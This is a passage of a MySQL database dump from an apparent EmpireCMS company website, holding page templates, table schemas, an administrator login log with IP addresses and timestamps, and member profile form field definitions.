fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]4,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d H:i:s',22,0,0),(4,'公司实力列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n   \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]5,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0);
/*!40000 ALTER TABLE `libang_enewslisttemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslisttempclass`
--

DROP TABLE IF EXISTS `libang_enewslisttempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslisttempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslisttempclass`
--

LOCK TABLES `libang_enewslisttempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewslisttempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewslisttempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslog`
--

DROP TABLE IF EXISTS `libang_enewslog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslog` (
  `loginid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL DEFAULT '',
  `logintime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `loginip` varchar(20) NOT NULL DEFAULT '',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `password` varchar(30) NOT NULL DEFAULT '',
  `loginauth` tinyint(1) NOT NULL DEFAULT '0',
  `ipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`loginid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=92 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslog`
--

LOCK TABLES `libang_enewslog` WRITE;
/*!40000 ALTER TABLE `libang_enewslog` DISABLE KEYS */;
INSERT INTO `libang_enewslog` VALUES (1,'admin','2020-04-15 14:11:32','127.0.0.1',1,'',0,'52086'),(2,'admin','2020-04-15 16:37:06','127.0.0.1',1,'',0,'56768'),(3,'admin','2020-04-16 10:11:25','127.0.0.1',1,'',0,'62001'),(4,'admin','2020-04-16 11:43:25','127.0.0.1',1,'',0,'50226'),(5,'admin','2020-04-16 13:46:56','127.0.0.1',1,'',0,'54596'),(6,'admin','2020-04-16 15:15:18','127.0.0.1',1,'',0,'50169'),(7,'admin','2020-04-16 15:31:23','127.0.0.1',1,'',0,'51042'),(8,'admin','2020-04-17 09:50:58','127.0.0.1',1,'',0,'54346'),(9,'admin','2020-04-17 11:25:48','127.0.0.1',1,'',0,'65202'),(10,'admin','2020-04-17 13:13:12','127.0.0.1',1,'',0,'59232'),(11,'admin','2020-04-17 13:29:25','127.0.0.1',1,'',0,'60154'),(12,'admin','2020-04-20 15:56:24','222.210.87.241',1,'',0,'54890'),(13,'admin','2020-04-20 16:02:43','222.210.87.241',1,'',0,'25889'),(14,'admin','2020-04-23 10:10:29','222.210.87.241',1,'',0,'48895'),(15,'admin','2020-04-23 10:30:49','222.210.87.241',1,'',0,'50159'),(16,'admin','2020-04-23 11:13:20','222.210.87.241',1,'',0,'59593'),(17,'admin','2020-04-23 12:28:23','222.210.87.241',1,'',0,'57967'),(18,'admin','2020-04-23 15:35:54','222.210.87.241',1,'',0,'3937'),(19,'admin','2020-04-23 15:40:34','222.210.87.241',1,'',0,'62822'),(20,'admin','2020-04-23 17:08:26','222.210.87.241',1,'',0,'58858'),(21,'admin','2020-04-24 10:27:29','222.210.87.241',1,'',0,'20703'),(22,'admin','2020-04-29 10:52:03','182.138.226.190',1,'',0,'24121'),(23,'admin','2020-04-29 17:00:52','182.138.226.190',1,'',0,'62855'),(24,'admin','2020-04-29 17:13:25','182.138.226.190',1,'',0,'63764'),(25,'admin','2020-05-06 10:14:39','110.185.38.87',1,'',0,'59292'),(26,'admin','2020-05-06 13:48:36','118.112.90.135',1,'',0,'54752'),(27,'admin','2020-05-06 13:55:17','118.112.90.135',1,'',0,'55311'),(28,'admin','2020-05-06 13:57:23','118.112.90.135',1,'',0,'55543'),(29,'admin','2020-05-06 13:58:05','118.112.90.135',1,'',0,'55126'),(30,'admin','2020-05-06 13:59:52','118.112.90.135',1,'',0,'55434'),(31,'admin','2020-05-08 07:10:14','117.176.229.170',1,'',0,'13679'),(32,'admin','2020-05-08 17:43:05','118.112.90.135',1,'',0,'52434'),(33,'admin','2020-05-09 11:23:49','118.112.90.135',1,'',0,'62438'),(34,'admin','2020-05-12 15:11:15','110.185.38.87',1,'',0,'61953'),(35,'admin','2020-05-12 17:29:02','110.185.38.87',1,'',0,'54704'),(36,'admin','2020-05-13 10:35:33','110.185.38.87',1,'',0,'29547'),(37,'admin','2020-05-13 17:03:09','110.185.38.87',1,'',0,'55908'),(38,'admin','2020-05-13 17:49:58','110.185.38.87',1,'',0,'57442'),(39,'admin','2020-05-14 11:25:55','110.185.38.87',1,'',0,'26399'),(40,'admin','2020-05-18 14:14:15','110.185.38.87',1,'',0,'63767'),(41,'admin','2020-05-19 10:23:46','110.185.38.87',1,'',0,'55675'),(42,'admin','2020-05-19 10:31:13','110.185.38.87',1,'',0,'63916'),(43,'admin','2020-05-20 17:27:09','110.185.38.87',1,'',0,'55557'),(44,'admin','2020-06-30 10:17:21','171.213.29.24',1,'',0,'33246'),(45,'admin','2020-07-01 11:46:13','220.166.231.88',1,'',0,'34558'),(46,'admin','2020-09-21 10:32:46','220.166.228.198',1,'',0,'23268'),(47,'admin','2020-11-15 00:26:55','47.92.241.24',0,'',0,'50716'),(48,'admin','2020-11-15 00:26:55','47.92.241.24',0,'',0,'50759'),(49,'admin','2020-11-15 00:26:55','47.92.241.24',0,'',0,'50791'),(50,'admin','2020-11-15 00:26:56','47.92.241.24',0,'',0,'50821'),(51,'admin','2020-11-15 00:26:56','47.92.241.24',0,'',0,'50857'),(52,'sclbgc','2020-11-15 10:41:28','47.92.241.24',0,'',0,'58715'),(53,'sclbgc','2020-11-15 10:41:29','47.92.241.24',0,'',0,'58788'),(54,'sclbgc','2020-11-15 10:41:30','47.92.241.24',0,'',0,'58988'),(55,'sclbgc','2020-11-15 10:41:31','47.92.241.24',0,'',0,'59111'),(56,'sclbgc','2020-11-15 10:41:31','47.92.241.24',0,'',0,'59235'),(57,'admin','2020-11-16 16:46:45','47.113.225.249',0,'',0,'58509'),(58,'admin','2020-11-16 16:46:45','47.113.225.249',1,'',0,'58511'),(59,'admin','2020-11-18 15:51:30','47.113.225.249',0,'',0,'58478'),(60,'admin','2020-11-18 15:51:30','47.113.225.249',1,'',0,'58487'),(61,'admin','2020-11-19 23:01:41','47.113.225.249',0,'',0,'63214'),(62,'admin','2020-11-19 23:01:42','47.113.225.249',1,'',0,'63220'),(63,'admin','2020-11-20 20:19:41','202.62.112.39',1,'',0,'1170'),(64,'admin','2020-11-23 17:20:23','47.113.225.249',0,'',0,'49444'),(65,'admin','2020-11-23 17:20:24','47.113.225.249',1,'',0,'56847'),(66,'admin','2020-11-24 19:02:25','47.113.225.249',0,'',0,'59666'),(67,'admin','2020-11-24 19:02:25','47.113.225.249',1,'',0,'59895'),(68,'admin','2020-11-25 18:42:27','39.98.49.33',0,'',0,'55062'),(69,'admin','2020-11-25 18:42:27','39.98.49.33',1,'',0,'55088'),(70,'admin','2020-11-25 18:45:25','39.98.49.33',0,'',0,'49943'),(71,'admin','2020-11-25 18:45:25','39.98.49.33',0,'',0,'49956'),(72,'admin','2020-11-25 18:45:25','39.98.49.33',0,'',0,'49970'),(73,'admin','2020-11-25 18:45:26','39.98.49.33',0,'',0,'49990'),(74,'admin','2020-11-28 17:19:17','47.113.225.249',0,'',0,'62603'),(75,'admin','2020-11-28 17:19:17','47.113.225.249',1,'',0,'62618'),(76,'sclbgc','2020-11-29 12:28:44','47.92.241.24',0,'',0,'65512'),(77,'sclbgc','2020-11-29 12:28:45','47.92.241.24',0,'',0,'65534'),(78,'sclbgc','2020-11-29 12:28:45','47.92.241.24',0,'',0,'49179'),(79,'sclbgc','2020-11-29 12:28:46','47.92.241.24',0,'',0,'49202'),(80,'admin','2020-11-29 12:28:47','47.92.241.24',0,'',0,'65518'),(81,'admin','2021-01-06 14:06:14','220.166.229.153',1,'',0,'56549'),(82,'admin','2022-03-04 11:02:30','220.166.228.174',1,'',0,'54998'),(83,'admin','2022-03-04 11:24:46','220.166.228.174',1,'',0,'57075'),(84,'admin','2022-03-04 13:14:29','220.166.228.174',1,'',0,'57991'),(85,'admin','2022-03-04 14:37:13','220.166.228.174',1,'',0,'55791'),(86,'admin','2022-04-14 11:28:15','220.166.228.81',1,'',0,'22053'),(87,'admin','2022-04-14 11:28:57','220.166.228.81',1,'',0,'22668'),(88,'admin','2022-04-14 11:29:45','171.214.217.147',0,'',0,'25174'),(89,'admin','2022-04-14 11:29:56','171.214.217.147',0,'',0,'25177'),(90,'admin','2022-04-14 11:30:53','220.166.228.81',1,'',0,'23498'),(91,'admin','2022-04-14 11:31:26','171.214.217.147',1,'',0,'25225');
/*!40000 ALTER TABLE `libang_enewslog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsloginfail`
--

DROP TABLE IF EXISTS `libang_enewsloginfail`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsloginfail` (
  `ip` varchar(20) NOT NULL DEFAULT '',
  `num` tinyint(4) NOT NULL DEFAULT '0',
  `lasttime` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsloginfail`
--

LOCK TABLES `libang_enewsloginfail` WRITE;
/*!40000 ALTER TABLE `libang_enewsloginfail` DISABLE KEYS */;
INSERT INTO `libang_enewsloginfail` VALUES ('171.214.217.147',2,1649906996);
/*!40000 ALTER TABLE `libang_enewsloginfail` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmember`
--

DROP TABLE IF EXISTS `libang_enewsmember`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmember` (
  `userid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL DEFAULT '',
  `password` char(32) NOT NULL DEFAULT '',
  `rnd` char(20) NOT NULL DEFAULT '',
  `email` char(50) NOT NULL DEFAULT '',
  `registertime` int(10) unsigned NOT NULL DEFAULT '0',
  `groupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `userfen` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userdate` int(10) unsigned NOT NULL DEFAULT '0',
  `money` float(11,2) NOT NULL DEFAULT '0.00',
  `zgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `havemsg` tinyint(1) NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `salt` char(8) NOT NULL DEFAULT '',
  `userkey` char(12) NOT NULL DEFAULT '',
  `ingid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `agid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isern` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`userid`),
  UNIQUE KEY `username` (`username`),
  KEY `groupid` (`groupid`),
  KEY `ingid` (`ingid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmember`
--

LOCK TABLES `libang_enewsmember` WRITE;
/*!40000 ALTER TABLE `libang_enewsmember` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmember` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmember_connect`
--

DROP TABLE IF EXISTS `libang_enewsmember_connect`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmember_connect` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `apptype` char(20) NOT NULL DEFAULT '',
  `bindkey` char(32) NOT NULL DEFAULT '',
  `bindtime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginnum` int(10) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `bindkey` (`bindkey`),
  KEY `apptype` (`apptype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmember_connect`
--

LOCK TABLES `libang_enewsmember_connect` WRITE;
/*!40000 ALTER TABLE `libang_enewsmember_connect` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmember_connect` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmember_connect_app`
--

DROP TABLE IF EXISTS `libang_enewsmember_connect_app`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmember_connect_app` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `apptype` char(20) NOT NULL DEFAULT '',
  `appname` char(30) NOT NULL DEFAULT '',
  `appid` char(60) NOT NULL DEFAULT '',
  `appkey` char(120) NOT NULL DEFAULT '',
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `qappname` char(30) NOT NULL DEFAULT '',
  `appsay` char(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `apptype` (`apptype`),
  KEY `isclose` (`isclose`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmember_connect_app`
--

LOCK TABLES `libang_enewsmember_connect_app` WRITE;
/*!40000 ALTER TABLE `libang_enewsmember_connect_app` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmember_connect_app` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmemberadd`
--

DROP TABLE IF EXISTS `libang_enewsmemberadd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmemberadd` (
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `truename` varchar(20) NOT NULL DEFAULT '',
  `oicq` varchar(25) NOT NULL DEFAULT '',
  `msn` varchar(120) NOT NULL DEFAULT '',
  `mycall` varchar(30) NOT NULL DEFAULT '',
  `phone` varchar(30) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` varchar(8) NOT NULL DEFAULT '',
  `spacestyleid` smallint(6) NOT NULL DEFAULT '0',
  `homepage` varchar(200) NOT NULL DEFAULT '',
  `saytext` text NOT NULL,
  `company` varchar(255) NOT NULL DEFAULT '',
  `fax` varchar(30) NOT NULL DEFAULT '',
  `userpic` varchar(200) NOT NULL DEFAULT '',
  `spacename` varchar(255) NOT NULL DEFAULT '',
  `spacegg` text NOT NULL,
  `viewstats` int(11) NOT NULL DEFAULT '0',
  `regip` varchar(20) NOT NULL DEFAULT '',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastip` varchar(20) NOT NULL DEFAULT '',
  `loginnum` int(10) unsigned NOT NULL DEFAULT '0',
  `regipport` varchar(6) NOT NULL DEFAULT '',
  `lastipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmemberadd`
--

LOCK TABLES `libang_enewsmemberadd` WRITE;
/*!40000 ALTER TABLE `libang_enewsmemberadd` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmemberadd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmemberf`
--

DROP TABLE IF EXISTS `libang_enewsmemberf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmemberf` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `f` varchar(30) NOT NULL DEFAULT '',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `fform` varchar(20) NOT NULL DEFAULT '',
  `fhtml` mediumtext NOT NULL,
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `ftype` varchar(30) NOT NULL DEFAULT '',
  `flen` varchar(20) NOT NULL DEFAULT '',
  `fvalue` text NOT NULL,
  `fformsize` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmemberf`
--

LOCK TABLES `libang_enewsmemberf` WRITE;
/*!40000 ALTER TABLE `libang_enewsmemberf` DISABLE KEYS */;
INSERT INTO `libang_enewsmemberf` VALUES (1,'truename','真实姓名','text','\r\n<input name=\"truename\" type=\"text\" id=\"truename\" value=\"<?=$ecmsfirstpost==1?\"\":ehtmlspecialchars(stripSlashes($addr[truename]))?>\">\r\n','',1,'VARCHAR','20','',''),(2,'oicq','QQ号码','text','<input name=\\\"oicq\\\" type=\\\"text\\\" id=\\\"oicq\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[oicq]))?>\\\">\r\n','',5,'VARCHAR','25','',''),(3,'msn','MSN','text','<input name=\\\"msn\\\" type=\\\"text\\\" id=\\\"msn\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[msn]))?>\\\">\r\n','',6,'VARCHAR','120','',''),(4,'mycall','联系电话','text','<input name=\\\"mycall\\\" type=\\\"text\\\" id=\\\"mycall\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[mycall]))?>\\\">\r\n','',2,'VARCHAR','30','',''),(5,'phone','手机','text','<input name=\\\"phone\\\" type=\\\"text\\\" id=\\\"phone\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[phone]))?>\\\">\r\n','',4,'VARCHAR','30','',''),(6,'address','联系地址','text','<input name=\\\"address\\\" type=\\\"text\\\" id=\\\"address\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[address]))?>\\\" size=\\\"50\\\">\r\n','',9,'VARCHAR','255','',''),(7,'zip','邮编','text','<input name=\\\"zip\\\" type=\\\"text\\\" id=\\\"zip\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[zip]))?>\\\" size=\\\"8\\\">\r\n','',10,'VARCHAR','8','',''),(9,'homepage','网址','text','\r\n<input name=\"homepage\" type=\"text\" id=\"homepage\" value=\"<?=$ecmsfirstpost==1?\"\":ehtmlspecialchars(stripSlashes($addr[homepage]))?>\">\r\n','',7,'VARCHAR','200','',''),(10,'saytext','简介','textarea','<textarea name=\\\"saytext\\\" cols=\\\"65\\\" rows=\\\"10\\\" id=\\\"saytext\\\"><?=$ecmsfirstpost==1?\\\"\\\":stripSlashes($addr[saytext])?></textarea>\r\n','',11,'TEXT','','',''),(11,'company','公司名称','text','<input name=\\\"company\\\" type=\\\"text\\\" id=\\\"company\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($addr[company]))?>\\\" size=\\\"38\\\">\r\n','',0,'VARCHAR','255','',''),(12,'fax','传真','text','\r\n<input name=\"fax\" type=\"text\" id=\"fax\" value=\"<?=$ecmsfirstpost==1?\"\":ehtmlspecialchars(stripSlashes($addr[fax]))?>\">\r\n','',3,'VARCHAR','30','',''),(13,'userpic','会员头像','img','<input type=\\\"file\\\" name=\\\"userpicfile\\\">&nbsp;&nbsp;\r\n<?=empty($addr[userpic])?\\\"\\\":\\\"<img src=\\\'\\\".ehtmlspecialchars(stripSlashes($addr[userpic])).\\\"\\\' border=0>\\\"?>','',8,'VARCHAR','200','','');
/*!40000 ALTER TABLE `libang_enewsmemberf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmemberfeedback`
--

DROP TABLE IF EXISTS `libang_enewsmemberfeedback`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmemberfeedback` (
  `fid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(12) NOT NULL DEFAULT '',
  `company` varchar(80) NOT NULL DEFAULT '',
  `phone` varchar(30) NOT NULL DEFAULT '',
  `fax` varchar(20) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` varchar(8) NOT NULL DEFAULT '',
  `title` varchar(120) NOT NULL DEFAULT '',
  `ftext` text NOT NULL,
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ip` varchar(15) NOT NULL DEFAULT '',
  `uid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `uname` varchar(20) NOT NULL DEFAULT '',
  `addtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `eipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmemberfeedback`
--

LOCK TABLES `libang_enewsmemberfeedback` WRITE;
/*!40000 ALTER TABLE `libang_enewsmemberfeedback` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmemberfeedback` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmemberform`
--

DROP TABLE IF EXISTS `libang_enewsmemberform`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmemberform` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `fname` varchar(60) NOT NULL DEFAULT '',
  `ftemp` mediumtext NOT NULL,
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `enter` text NOT NULL,
  `mustenter` text NOT NULL,
  `filef` varchar(255) NOT NULL DEFAULT '',
  `imgf` varchar(255) NOT NULL DEFAULT '0',
